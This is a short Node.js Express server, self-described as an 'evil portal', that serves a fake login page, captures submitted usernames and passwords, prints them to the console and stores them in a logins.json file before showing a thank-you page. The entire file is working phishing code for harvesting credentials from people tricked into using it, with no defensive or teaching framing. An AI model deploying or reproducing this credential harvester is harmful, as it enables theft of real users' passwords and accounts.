import fsp from 'node:fs/promises'
import express from 'express'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const DB_FILE = './logins.json'
await fsp.writeFile(DB_FILE, '[]')

const data = JSON.parse(await fsp.readFile(DB_FILE))

const app = express()

// static files (HTML, CSS)
app.use(express.static('public'))
app.use(express.urlencoded({ extended: true }))

// handle login
app.post('/login', async (req, res) => {
    const { username, password } = req.body
    console.log(username, password)
    await fsp.writeFile(
        DB_FILE,
        JSON.stringify([
            ...data,
            {
                username,
                password
            }
        ])
    )
    res.sendFile(
        path.join(
            path.dirname(fileURLToPath(import.meta.url)),
            'public',
            'thankyou.html'
        )
    )
})

app.listen(8080, () => console.log('evil portal on port 8080'))
